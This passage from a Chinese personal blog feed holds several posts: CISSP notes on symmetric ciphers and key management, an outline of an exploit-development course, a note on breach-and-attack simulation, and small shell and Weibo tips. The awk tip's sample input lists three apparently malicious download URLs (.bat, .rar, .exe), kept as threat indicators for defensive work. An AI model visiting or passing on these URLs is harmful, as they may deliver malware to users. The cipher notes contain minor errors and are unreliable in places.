title="三重DES"></a>三重DES</h3><p>3DES有多个不同变体，每个变体都使用了不同数量的独立密钥。</p><p>头两个变体DES-EDE3和DES-EEE3使用了3个不同的独立密钥：K1、K2、K3。</p><p>DES-EDE3和DES-EEE3的区别：</p><p>执行的运算不同，字母E代表加密，D代表解密</p><p>EDE3用K1给数据加密，用K2解密得出的密文，然后用K3加密文本。可以用如下表达式表示，其中E(K,P)代表用密钥K给明文P加密，D(K,P)代表用密钥K给密文C解密：E(K1,D(K2,E(K3,P)))</p><p>EEE3用所有的3个密钥依次给数据加密，可表示为：E(K1,E(K2,E(K3,P)))</p><p>从数学角度上讲，DES-EDE3和DES-EEE3应该具有168位有效密钥长度，但是由于已知的攻击把算法的有效强度降为了112位。</p><h3 id="国际数据加密算法"><a href="#国际数据加密算法" class="headerlink" title="国际数据加密算法"></a>国际数据加密算法</h3><p>“国际加密算法”（IDEA）块密码在64位明文&#x2F;密文块上运行，不过，IDEA是用一个128位密钥开始运算的，该密钥在一系列运算中被分解为52个16位子密钥。子密钥随后通过异或与模运算的结合作用到输入文本上，以产生输入消息的加密&#x2F;解密版。</p><p>IDEA能在DES使用的5中模式（ECB、CBC、CFB、OFB、CTR）下运行。</p><h3 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h3><p>Bruce Schneier 的 Blowfish 块密码是 DES 和IDEA的另一个替换方案。</p><p>Blowfish 在64位文本块上运行，但是Blowfish允许密钥长度变化（其中最短为相对不太安全的32位，最长为极强的448位），从而进一步扩展了IDEA的密钥强度。</p><p>正常情况下，密钥的加长会导致加密&#x2F;解密时间的相应增加。但时间实验证明，Blowfish这种算法比IDEA和DES的速度要快很多。同时Schneier对公众开放Blowfish，使用它不需要任何许可证。</p><h3 id="Skipjack"><a href="#Skipjack" class="headerlink" title="Skipjack"></a>Skipjack</h3><p>Skipjack 算法被美国政府在联邦信息处理表中（FIPS）185“托管加密标准”（EES）中批准使用。</p><p>Skipjack在64位文本块上运行，使用 80 位密钥，支持 DES支持的四种运行模式。</p><p>Skipjack 支持机密密钥托管。美国NIST和财政部各持有重建 Skipjack 密钥所需信息的一部分。</p><h3 id="Rivest-Ciphers"><a href="#Rivest-Ciphers" class="headerlink" title="Rivest Ciphers"></a>Rivest Ciphers</h3><p>Rivest-Shamir-Adleman（RSA）Data Security 公司的 Ron Rivest 创建了一系列对称密码，业界称为 Rivest Cipher（RC）算法家族。</p><p>RC4、RC5、RC6在当今发挥了特别重要的作用</p><h4 id="Rivest-Ciphers-4（RC4）"><a href="#Rivest-Ciphers-4（RC4）" class="headerlink" title="Rivest Ciphers 4（RC4）"></a>Rivest Ciphers 4（RC4）</h4><p>1987年开发的一种流密码。</p><p>只进行一轮加密，运行使用40-2048位的长度可变密钥。</p><p>被集成到有线等效隐私（WEP）、Wi-Fi保护防护（WPA）、安全套接字层（SSL）和传输层安全（TLS）等协议中。</p><p>RC4遭到一系列攻击导致不安全，也就是WEP、SSL、WPA不再符合现代安全标准，而TLS也不再允许把RC4用作流密码。</p><h4 id="Rivest-Ciphers-5（RC5）"><a href="#Rivest-Ciphers-5（RC5）" class="headerlink" title="Rivest Ciphers 5（RC5）"></a>Rivest Ciphers 5（RC5）</h4><p>RC 5 是一种块大小可变（32、64和128位）的块密码，所用密钥大小为 0-2040 位。</p><p>RC 5 与 RC 4 无关，是 RC 2 的改进版。</p><p>RC 5 承担暴力破解实验，64位密钥RC5加密的消息，需要 4 年多时间才破解。</p><h4 id="Rivest-Ciphers-6（RC6）"><a href="#Rivest-Ciphers-6（RC6）" class="headerlink" title="Rivest Ciphers 6（RC6）"></a>Rivest Ciphers 6（RC6）</h4><p>RC6 是作为 RC5 下一个版本而开发的一种块密码。</p><p>RC6 采用 128 位块大小，允许使用 128、192和256位对称密码。</p><h3 id="高级加密标准"><a href="#高级加密标准" class="headerlink" title="高级加密标准"></a>高级加密标准</h3><p>2000年，美国国家标准与技术研究院（NIST）宣布，Rijndael块密码被选中用来代替 DES。</p><p>高级机密标准 AES 密码允许使用 3 种密钥强度：128、192和256位。</p><p>AES 只允许处理 128 位块，但Rijndael超出了该规定，运行密码学家使用与密钥长度相等的块大小。</p><p>加密的轮数取决于所选密钥的长度</p><p>128位密钥要求 10 轮加密。</p><p>192位密钥要求 12 轮加密。</p><p>256位密钥要求 14 轮加密。</p><h3 id="CAST"><a href="#CAST" class="headerlink" title="CAST"></a>CAST</h3><p>CAST 算法被集成进一些安全解决方案的对称密钥块密码家族。</p><p>CAST 算法使用了 Feistel 网络，有两种表现形式：</p><p>CAST-128 用大小为 40-128 位的密钥对 64 位明文块进行 12-16轮 Feistel 网络加密。</p><p>CAST-256 用大小为 128、160、192、224或256位的密钥对 128 位明文块进行 48 轮加密。</p><h3 id="Twofish"><a href="#Twofish" class="headerlink" title="Twofish"></a>Twofish</h3><p>Bruce Schneier（也是 Blowfish 的创造者）开发的 Twofish 算法是 AES 的另一个终极品。</p><p>与 Rijndael 一样，Twofish 是一种块密码，在 128 位数据块上运行，能够使用长达 256 位的密码密钥。</p><p>Twofish独有的两种算法：</p><p>预白化处理（prewhitening）指第 1 轮加密前用一个单独的子密钥对明文进行异或运算。</p><p>白化后处理（postwhitening）指 16 轮加密后执行同样的运算。</p><h3 id="✨对比各种加密算法"><a href="#✨对比各种加密算法" class="headerlink" title="✨对比各种加密算法"></a>✨对比各种加密算法</h3><table><thead><tr><th>名称</th><th>块大小</th><th>密钥大小</th></tr></thead><tbody><tr><td>高级加密标准（AES）</td><td>128</td><td>128、192、256</td></tr><tr><td>Rijndael</td><td>可变</td><td>128、192、256</td></tr><tr><td>Blowfish（常用于 SSH）</td><td>64</td><td>32-448</td></tr><tr><td>数据加密标准（DES）</td><td>64</td><td>56</td></tr><tr><td>IDEA（用于 PGP）</td><td>64</td><td>128</td></tr><tr><td>Rivest Cipher 4（RC4）</td><td>无（流密码）</td><td>40-2048</td></tr><tr><td>Rivest Cipher 5（RC5）</td><td>32、64、128</td><td>0-2040</td></tr><tr><td>Rivest Cipher 6（RC6）</td><td>128</td><td>128、192、256</td></tr><tr><td>Skipjack</td><td>64</td><td>80</td></tr><tr><td>三重DES（3DES）</td><td>64</td><td>112或168</td></tr><tr><td>CAST-128</td><td>64</td><td>40-128</td></tr><tr><td>CAST-256</td><td>128</td><td>128、160、192、224、256</td></tr><tr><td>Twofish</td><td>128</td><td>1-256</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="对称密钥管理"><a href="#对称密钥管理" class="headerlink" title="对称密钥管理"></a>对称密钥管理</h3><p>密钥管理实践（key management practice）规范，其中包括涉及秘密密钥的创建、分发、存储、销毁、恢复和托管的防护手段。</p><h4 id="创建和分发对称密钥"><a href="#创建和分发对称密钥" class="headerlink" title="创建和分发对称密钥"></a>创建和分发对称密钥</h4><h5 id="安全交换秘密密钥的三种方式"><a href="#安全交换秘密密钥的三种方式" class="headerlink" title="安全交换秘密密钥的三种方式"></a>安全交换秘密密钥的三种方式</h5><h6 id="线下分发"><a href="#线下分发" class="headerlink" title="线下分发"></a>线下分发</h6><p>技术最简单</p><p>存在物理不方便，尤其当处于地理位置遥远的地方</p><p>传输渠道如写有秘密密钥的一张纸（存在被随意丢弃的风险）或装有秘密密钥的一块存储介质（快递过程中存在被拦截风险）</p><h6 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h6><p>公钥加密（非对称加密）建立安全通信连接，交换秘密密钥（对称加密），后续采用秘密密钥（对称加密）进行数据传输。</p><h6 id="Diffie-Hellman密钥交换算法"><a href="#Diffie-Hellman密钥交换算法" class="headerlink" title="Diffie-Hellman密钥交换算法"></a>Diffie-Hellman密钥交换算法</h6><p>线下分发和公钥加密都无法满足需求时，需要使用Diffie-Hellman密钥交换算法。</p><h4 id="存储和销毁对称密钥"><a href="#存储和销毁对称密钥" class="headerlink" title="存储和销毁对称密钥"></a>存储和销毁对称密钥</h4><p>对称加密的重大挑战：必须确保密码系统使用的所有密钥的安全。</p><p>加密密钥存储的最佳实践规范：<br>1、绝不将加密密钥与被加密数据保存在同一个系统里。</p><p>2、对于敏感密钥，考虑安排两人各持一半片段。两人必须同时到场才能重建整个密钥，也就是分割知识原理。</p><p>密钥存储机制选项：</p><p>1、基于软件的存储机制可把密钥作为数字对象保存到使用密钥的系统中</p><p>简便易行，存在引入软件机制遭破坏的风险</p><p>2、基于硬件的存储机制是专用于管理密钥的硬件设备</p><p>也被称为硬件安全模块（hardware security module，HSM）</p><p>更复杂，成本更高，可以提供额外的安全保护</p><h4 id="密钥托管和恢复"><a href="#密钥托管和恢复" class="headerlink" title="密钥托管和恢复"></a>密钥托管和恢复</h4><h5 id="密钥托管"><a href="#密钥托管" class="headerlink" title="密钥托管"></a>密钥托管</h5><p>用于密钥托管的方法：</p><p>1、<strong>公平密码系统</strong> </p><p>通信的秘密被分解成两个或多个片段，每个片段都交由独立的第三方保管，单独的片段不能发挥功效，需要政府获取授权后组合在一起生效。</p><p>2、<strong>托管加密标准</strong></p><p>向政府或另一授权代理提供解密密文的技术手段。</p><p>该方法专门针对Clipper芯片提出的。</p><h5 id="密钥恢复"><a href="#密钥恢复" class="headerlink" title="密钥恢复"></a>密钥恢复</h5><p>密钥恢复代理（recovery agent，RA）能够恢复分配给各个用户的加密密钥。</p><p>背景：</p><p>人员离职、密钥丢失时需要访问加密数据</p><p>控制机制：</p><p>N之取M控制的机制来恢复密钥，N个成员有特权，至少M个成员同意才可以实施。</p><h2 id="密码生命周期"><a href="#密码生命周期" class="headerlink" title="密码生命周期"></a>密码生命周期</h2><p>除了单次密本以外，所有秘密系统的使用寿命都是有限的。</p><p>摩尔定律对计算机能力发展趋势的预测，最先进的微处理器的处理能力大约每两年会提高一倍。</p><p>选择加密算法时，必须重视密码生命周期问题，且必须通过适当的管治控制确保无论需要多长时间内保证受保护的信息不泄密。</p><p>所选择的算法、协议和密钥长度都足以保持密码系统的完整性。</p><p>1、规定机构可接受的密码算法，如AES、3DES和RSA。</p><p>2、根据被传输信息的敏感性识别可与每种算法配套使用的可接受密钥长度。</p><p>3、枚举可用的安全交易协议，如TLS</p><p>密码生命周期的选择需要结合需要保护的内容决定。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yuangekecheng</title>
    <link href="/2024/12/26/security/secstudy/yuangekecheng/"/>
    <url>/2024/12/26/security/secstudy/yuangekecheng/</url>
    
    <content type="html"><![CDATA[<p>中级班课程目录</p><p>一、溢出利用<br>1、平台演示<br>2、exp代码框架、SHELLCODE编写<br>3、溢出通道对抗防火墙<br>4、异常链表对抗堆栈COOKIES保护技术<br>5、溢出跳转、兼容技术<br>6、堆溢出利用<br>7、溢出程序跟踪调试<br>8、一些典型溢出漏洞分析<br>9、RPC编程简单介绍<br>10、RPC的漏洞利用<br>11、一些典型的RPC漏洞分析<br>12、更多的利用代码包括RPC漏洞利用代码<br>二、漏洞挖掘<br>1、漏洞研究<br>2、数据流挖掘技术<br>3、FUZZ技术<br>4、关键API、系统特性<br>5、内核漏洞挖掘和利用技术<br>三、总结提高<br>1、前面内容的一些补充<br>2、高级DVE对抗技术<br>3、xp挑战赛对抗360沙箱技术</p><p>高级班课程目录</p><p>一、溢出利用<br>1、平台演示<br>2、exp代码框架、SHELLCODE编写<br>3、溢出通道对抗防火墙<br>4、异常链表对抗堆栈COOKIES保护技术<br>5、溢出跳转、兼容技术<br>6、堆溢出利用<br>7、溢出程序跟踪调试<br>8、一些典型溢出漏洞分析，更多一些<br>9、RPC编程简单介绍<br>10、RPC的漏洞利用<br>11、一些典型的RPC漏洞分析<br>12、更多的利用代码包括RPC漏洞利用代码，比中级班再更多<br>二、漏洞挖掘<br>1、漏洞研究<br>2、数据流挖掘技术<br>3、FUZZ<br>4、关键API、系统特性<br>5、内核漏洞挖掘和利用技术<br>6、RPC漏洞的挖掘<br>7、RPC漏洞挖掘的小工具<br>三、总结提高<br>1、前面内容的一些补充<br>2、高级DVE对抗技术<br>3、xp挑战赛对抗360沙箱技术<br>4、调试技术<br>5、安全模型和安全本质理解</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secstudy</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>secops_bas</title>
    <link href="/2024/12/26/security/secops/secops_bas/"/>
    <url>/2024/12/26/security/secops/secops_bas/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>入侵和攻击模拟（BAS）</p><p>BAS是一种先进的信息安全技术，它通过模拟真实的攻击场景来评估和提高组织的网络安全防御能力。与传统的渗透测试和漏洞管理工具相比，BAS有着显著的不同之处。传统的渗透测试通常是由安全团队执行的一系列预先计划好的攻击行动，旨在发现系统中的漏洞并评估其严重性。而BAS则更加动态和全面，它不仅模拟攻击行为，还模拟了数据泄露的过程。这使得BAS能够更加真实地反映出安全防御在实际攻击面前的反应和表现。</p><p>BAS的攻击模拟是持续进行的，它不会只在特定时间进行一次性的测试，而是像持续的网络安全监控一样运行。BAS能够及时地检测和评估组织对于新出现的威胁的防御能力。使用BAS的目的是为了确保安全措施能够在不断变化的威胁环境中有效运作。这种模拟攻击可以验证安全策略、检测潜在的弱点，并提供实时反馈，帮助组织改善其安全防御。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secops</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secops</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weibo_video_download</title>
    <link href="/2024/12/26/yunwei/yunweitips/weibo_video_download/"/>
    <url>/2024/12/26/yunwei/yunweitips/weibo_video_download/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>微博中存在部分视频内容由于设置无法直接下载</p><h2 id="下载步骤"><a href="#下载步骤" class="headerlink" title="下载步骤"></a>下载步骤</h2><p>1、edge观看视频，右击“检查”，查看网络-&gt;媒体，复制对应的链接</p><p><img src="/image-20241226101057449.png" alt="image-20241226101057449"></p><p>2、直接访问复制的链接，会返回 403 </p><p><img src="/image-20241226101211385.png" alt="image-20241226101211385"></p><p>3、增加referer后可以正常访问</p><p><img src="/image-20241226101304944.png" alt="image-20241226101304944"></p><p>4、右击视频，点击“另存视频为”即可下载视频</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>delete_file_null_line</title>
    <link href="/2024/12/25/yunwei/yunweitips/delete_file_null_line/"/>
    <url>/2024/12/25/yunwei/yunweitips/delete_file_null_line/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h3><p>brew install coreutils 安装</p><h3 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h3><p>进入vim，输入以下命令删除空行</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/^</span><span class="hljs-variable">$/</span>d<br></code></pre></td></tr></table></figure><h3 id="sublime"><a href="#sublime" class="headerlink" title="sublime"></a>sublime</h3><p><strong>mac</strong></p><p>1、option+command+F 打开查找和替换窗口</p><p>2、查找框输入 ^\n</p><p>^ 表示行的开头</p><p>\n 表示换行符</p><p>3、替换框确保为空</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>awk</title>
    <link href="/2024/12/25/yunwei/yunweicommands/awk/"/>
    <url>/2024/12/25/yunwei/yunweicommands/awk/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="分割字符串"><a href="#分割字符串" class="headerlink" title="&#x2F; 分割字符串"></a>&#x2F; 分割字符串</h3><p>需要对多行URL的文本切割，输出域名，输出下标从1开始</p><p>cat filename.txt | awk -F ‘&#x2F;‘ ‘{print $3}’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://umeay.com/名单.bat<br>https://qqfnmasqq.bond/电子普票.rar<br>https://ehfof.shop/查阅8080.exe<br><br>➜  内网安全 <span class="hljs-built_in">cat</span> yhioc20241225.txt| awk -F <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span><br>umeay.com<br>qqfnmasqq.bond<br>ehfof.shop<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweicommands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweicommands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tk_group_message</title>
    <link href="/2024/12/24/informationCocoon/tk_group_message/"/>
    <url>/2024/12/24/informationCocoon/tk_group_message/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2024-12-23"><a href="#2024-12-23" class="headerlink" title="2024.12.23"></a>2024.12.23</h2><h3 id="砂糖橘不能吃的微博解读"><a href="#砂糖橘不能吃的微博解读" class="headerlink" title="砂糖橘不能吃的微博解读"></a>砂糖橘不能吃的微博解读</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>砂糖橘不能吃的微博</p><h4 id="TK解读"><a href="#TK解读" class="headerlink" title="TK解读"></a>TK解读</h4><p>首先，这条微博是在咋呼。但又不能说他在撒谎。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/27A87621-AECA-4D9C-8CC1-B3D136380408.png" alt="27A87621-AECA-4D9C-8CC1-B3D136380408"></p><p>他把nature那篇论文和别的一些东西揉到一起说了</p><p>这条微博在引流技巧的使用上是是教科书式的。因为</p><p>nature那篇论文我之前看过，讲的是果糖被转换为几种脂质后，可以被肿瘤细胞利用。</p><p>但如果一上来讲这个，很多人一看就脑子涨。</p><p>所以你们看，这条微博从头到尾没提具体细节，就是果糖、肿瘤。大家都能看懂。</p><p>但光是果糖、肿瘤，也还不够</p><p>但“砂糖橘真的不能再吃了”这就很到位</p><p>果糖、肿瘤这些词对一些人来说也会导致脑子涨。但“砂糖橘真的不能再吃了”这种句子大家都喜闻乐见。</p><p>虽然说使用脱酸剂的是柑橘类水果，但“柑橘类水果”这几个字就不如“沙糖桔”来的厉害。</p><p>所以，那条微博是精心设计的引流文。每个地方都不是随便写的。</p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tk_wb_blog</title>
    <link href="/2024/12/24/informationCocoon/tk_wb_blog/"/>
    <url>/2024/12/24/informationCocoon/tk_wb_blog/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018.1.29"></a>2018.1.29</h2><p>“保持好奇心”这个说法暗示了好奇心是一种先天的、易失的东西。如果现在有，必须努力保持才不会失去；而如果现在没有，就永远不会有。 </p><p><a href="https://weibo.com/1401527553/4201572646302667">https://weibo.com/1401527553/4201572646302667</a></p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224145809209.png" alt="image-20241224145809209"></p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018.6.17"></a>2018.6.17</h2><p>兴趣是产生自驱力的源头，但光靠兴趣无法维持自驱力。能为自驱力源源不断提供能量的必然是更强大的东西：好奇心和野心。 </p><p><a href="https://weibo.com/1401527553/4255510397959170">https://weibo.com/1401527553/4255510397959170</a></p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224150044001.png" alt="image-20241224150044001"></p><h2 id="2018-6-23"><a href="#2018-6-23" class="headerlink" title="2018.6.23"></a>2018.6.23</h2><p>最近有好几个毕业生问我关于 Offer 选择的问题——你可以问我某家公司在某个领域是什么情况，也可以问我某个技术方向好不好，但我不知道你是谁，不知道你是什么性格，不知道你是什么水平，不知道你家庭情况如何，我对你完全不了解，也不可能通过你几句话介绍就能了解，我也没有对发 Offer 的这几家公司做过调研分析，怎么可能知道什么选择适合你呢？</p><p>大学毕业的时候，我收到了 4 个 Offer。那时候我对安全行业了解很少，对这些公司更不了解。于是我花了数天时间，先把这些公司的网站都仔细看了，然后又搜索了这些公司的相关新闻，最后筛选出一南一北两家公司。我无法根据网上能看到的信息进一步判断，于是我坐火车去这两家公司分别看了一下，最后根据亲眼所见的情况做出了选择。后来事实证明我的选择的是对的。</p><p>2014 年换工作的时候，我收到了 5 个 Offer。这时候我虽然对安全行业比较了解，对这些公司也比较了解，但人到中年，这种重大决定仍然是不能轻易做的。所以我非常认真地从各个角度这些公司进行了调研，包括打听详细的内部规章制度，甚至找做了多个投资的朋友问他们对这些公司未来发展情况的判断。</p><p>为什么股市里散户干不过机构？因为散户看看网上的消息听听别人的忽悠就把自己多年辛苦的积蓄扔进去了。而机构是要实地调研的，要看一系列数据的。人生第一份工作非常重要，因为这是你第一次要把自己投资进去，所以必须自己下功夫。让别人帮自己做判断，就和听消息炒股的散户一样。</p><p><img src="/image-20250110201602541.png" alt="image-20250110201602541"></p><p><a href="https://weibo.com/1401527553/GmFKPb88C">https://weibo.com/1401527553/GmFKPb88C</a></p><h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><h2 id="2022-9-28"><a href="#2022-9-28" class="headerlink" title="2022.9.28"></a>2022.9.28</h2><p>有人想不通贾跃亭为什么到今天还要造车。</p><p>贾跃亭必须造车。普京必须打乌克兰。乾隆必须凑十全武功。这个用咱们过日子人的心去想是想不明白的。</p><p>好大喜功和雄才伟略之间的区别主要是干没干成。没干成就是好大喜功，干成了就是雄才伟略。</p><p>所以前面的例子只能举到乾隆。因为十全武功虽然凑成了，但比较勉强。后世夸得少，笑的多。所以说乾隆好大喜功不会有很多人反对。要是举了秦皇汉武的例子，挨骂的就是我了。我们从来不用“好大喜功”形容成功者。</p><p>其实，如果一个人不“好大喜功”，或者用现代词儿说叫“强烈的成就动机”，又怎么能做成大事呢？靠狗屎运吗？所以，单单“好大喜功”其实没什么不对。成功人士都好大喜功。</p><p>当然，说“好大喜功”等于“雄才伟略”其实也不对。“好大喜功”只对应了“伟略”。有伟略，还得有雄才。那么，即便最后没成，大家也认为是时也运也命也，不至于给个好大喜功的评价。诸葛亮五次北伐都没搞成，后人也不说他好大喜功，只说他鞠躬尽瘁。</p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224150406643.png" alt="image-20241224150406643"></p><p><a href="https://weibo.com/6827625527/4818648269064364">https://weibo.com/6827625527/4818648269064364</a></p><h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="2023-4-12"><a href="#2023-4-12" class="headerlink" title="2023.4.12"></a>2023.4.12</h2><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/007s41inly1hwvrayrmu0j30u011i7aq.jpg" alt="img"></p><h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="2024-5-7"><a href="#2024-5-7" class="headerlink" title="2024.5.7"></a>2024.5.7</h2><p><a href="https://weibo.com/6827625527/5031372701569943">https://weibo.com/6827625527/5031372701569943</a></p><p>我所在的某个群，里面主要是文艺工作者和科技工作者，以文艺工作者为主。搞书画的，搞雕塑的，搞音乐的，搞建筑的，搞时装的，主持人，作家，导演，啥都有。科技工作者从院士、科技企业家到我这样的小虾米，也是啥都有。</p><p>虽然这种群里大家说话不会太直接，不过还是可以感觉到气氛和社会主流思潮不太一样。他们就像所有时间所有空间的大多数艺术家和知识分子，真实的一面不怎么讨人喜欢。或者说，“脱离群众”。</p><p>有人问一个导演：你的那个作品在国内能上吗？导演说：等通知吧。</p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224112629346.png" alt="image-20241224112629346"></p><p>。。。。。</p><p>。。。。。</p><h2 id="2024-6-13"><a href="#2024-6-13" class="headerlink" title="2024.6.13"></a>2024.6.13</h2><p>你们有没有发现国内一些大模型的测评分数跟使用感受差别很大？看测评的话，编程能力普遍都超过 70 分。其中有些确实不错，但也有的感觉连 48.1 分的 GPT-3.5 都不如。最糟糕的一个甚至连某个 Python 模块能干什么不能干什么都搞不清楚。不知道是不是又发挥了擅于跑分的特长，搞了针对性优化。</p><p><img src="/image-20241230101316269.png" alt="image-20241230101316269"></p><p><a href="https://weibo.com/6827625527/5044845913835326">https://weibo.com/6827625527/5044845913835326</a></p><h2 id="2024-10-6"><a href="#2024-10-6" class="headerlink" title="2024.10.6"></a>2024.10.6</h2><p>我有一个自己的大模型测试集。其实就是设定了一系列结果可验证的任务。比如：推理一个函数的执行结果、写一个能完成某任务的程序、分析一个故事中的人物关系、找出一段描写中使用不当的形容词、给出一个电路某两点之间的电压，等等。</p><p>所以，在和一些没怎么使用过大模型的朋友讨论大模型的时候，大家往往会惊讶于我对一些模型的评价，并表示”某某模型在某某测试中排名很靠前啊！“</p><p>在大模型问题上，大家也不要忘了，咱们最擅长的就是“跑分”，或者叫“测评优化”。</p><p><img src="/image-20241230101529362.png" alt="image-20241230101529362"></p><h2 id="2024-12-24"><a href="#2024-12-24" class="headerlink" title="2024.12.24"></a>2024.12.24</h2><p>美国购物网站上有些商品页面能看到这样的免责声明 :</p><p>“本产品含有加利福尼亚州已知会导致癌症和出生缺陷或其他生殖危害的化学物质。”</p><p>这是加州 65 号提案也就是《1986 年安全饮用水和有毒物质执行法案》的要求。好在国内知道的人不多，要不然用这种当证据，能把一大堆产品都打成沙糖桔。</p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224101623194.png" alt="image-20241224101623194"></p><p><a href="https://weibo.com/6827625527/5086503290018903">https://weibo.com/6827625527/5086503290018903</a></p><h2 id="2024-12-28"><a href="#2024-12-28" class="headerlink" title="2024.12.28"></a>2024.12.28</h2><p>Linus Torvalds 并不是第一个叫 Linus 的名人。</p><p>Linus Pauling，在 1954 获得了诺贝尔化学奖，又在 1963 获得诺贝尔和平奖。历史上，独立获得两次诺贝尔奖的，仅此一人。获得过两个不同类型诺贝尔奖的，除他之外也只有一个居里夫人。</p><p>当代年轻人一般不太喜欢来自老年人的忠告。而 Linus Pauling 也曾经给年轻人忠告，让年轻人不要相信忠告：</p><p>“作为老一辈人，我想给你们一点忠告，应该怎样对待长辈。当一个年长的大人物对你说话时，认真恭敬地听，但别相信他。除了你自己的智慧，不要信任其它任何东西。一个老人，不管是白头发或者没头发，哪怕他得过诺贝尔奖，也可能是错的。你们必须永远保持怀疑，永远独立思考。”</p><p>至于 Linus Pauling 这段关于不要相信忠告的忠告到底是不是忠告，以及该不该相信这个不要相信忠告的忠告，我并不打算给你们忠告。</p><p><img src="/image-20241230111646406.png" alt="image-20241230111646406"></p><p><a href="https://weibo.com/6827625527/5116555441999662">https://weibo.com/6827625527/5116555441999662</a></p><h2 id="2024-12-29"><a href="#2024-12-29" class="headerlink" title="2024.12.29"></a>2024.12.29</h2><p>根据国家疾控中心最新一期流感监测周报，北方的流感样病例比南方严重很多。不过总体来说都比去年要轻。去年这个时候不仅比今年更严重，而且南方北方都很严重。</p><p>今年南北方流行的流感毒株基本都是 A(H1N1)pdm09。今年的三价、四价流感疫苗都覆盖了这个毒株。所以如果之前打了疫苗，应该能从中受益。</p><p>另外，除了极少数 A(H1N1)pdm09 毒株对神经氨酸酶抑制剂敏感性高度降低外，其它毒株对神经氨酸酶抑制剂和聚合酶抑制剂都敏感。简单说就是奥司他韦、玛巴洛沙韦都还好使。</p><p><img src="/image-20241230111422545.png" alt="image-20241230111422545"></p><p><a href="https://weibo.com/6827625527/5116566860203420">https://weibo.com/6827625527/5116566860203420</a></p><h2 id="2024-12-29-1"><a href="#2024-12-29-1" class="headerlink" title="2024.12.29"></a>2024.12.29</h2><p>这几天很多人都表达了对 DeepSeek 3 训练成本大幅降低的惊叹。但也有人说这是“断章取义”，比如认为他们训练的只是 FP8 精度，强调他们训练用了大量高质量合成数据，并认为得到这些数据的过程所消耗的算力也应该算在训练成本里。</p><p>看了两边的观点之后我觉得好像都有道理，而我也没有资格在这个问题上做出评价。模型训练是大玩家们的游戏。我们能关注的还是模型应用。实验室的同学已经在测试 DeepSeek 3 了，具体好不好用也还是要用了才知道。</p><p>另外，今年夏天的时候，我用我自己设定的测试任务测了一下几个大模型。国内的大模型多数都不能完成我的编程任务（<a 